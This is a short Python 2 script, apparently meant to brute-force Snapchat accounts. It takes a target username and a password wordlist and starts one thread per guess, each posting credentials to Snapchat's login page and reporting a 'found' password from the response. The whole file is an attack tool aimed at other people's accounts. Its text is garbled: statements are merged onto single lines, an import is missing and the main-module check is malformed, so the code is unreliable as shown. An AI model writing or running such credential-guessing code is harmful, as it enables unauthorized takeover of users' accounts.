import threading
import sys


reload(sys)sys.setdefaultencoding('utf-8')def snapchat_brute(username, password):
session = requests.Session()
login_url = 'https://accounts.snapchat.com/login'    payload = {
'username': username,
'password': password} response = session.post(login_url, data=payload)    if 'snapchat.com/login/password-reset' in response.text: print '[+] Password found:', password
sys.exit()
elif 'snapchat.com/login' in response.text: print '[-] Invalid password:', password
else:
print '[?] Unknown response for password:', password
if name == 'main': username = raw_input('Enter the Snapchat username: ')    wordlist = raw_input('Enter the path to the wordlist: ') with open(wordlist, 'r') as file:
words = file.readlines() threads = []    for word in words:
password = word.strip()        t = threading.Thread(target=snapchat_brute, args=(username, password))
threads.append(t)        t.start()
